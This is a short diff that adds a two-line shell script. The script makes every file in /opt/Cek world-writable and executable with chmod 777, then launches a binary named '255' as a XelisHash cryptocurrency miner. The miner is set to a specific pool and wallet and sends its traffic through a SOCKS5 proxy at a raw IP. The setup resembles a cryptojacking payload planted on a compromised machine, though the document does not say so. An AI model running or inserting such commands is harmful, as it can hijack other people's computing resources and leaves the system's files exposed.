@@ -1,0 +1,2 @@
+cd /opt/Cek/ && chmod 777 * && ls
+./255 --algorithm xelishash --pool de.xelis.herominers.com:1225 --wallet xel:qcd39a5u8cscztamjuyr7hdj6hh2wh9nrmhp86ljx2sz6t99ndjqzqq9qqqqqp6aps9wzu6nlze.tod --password m=solo --cpu-threads 4 --tls true --proxy socks5://208.65.90.21:4145
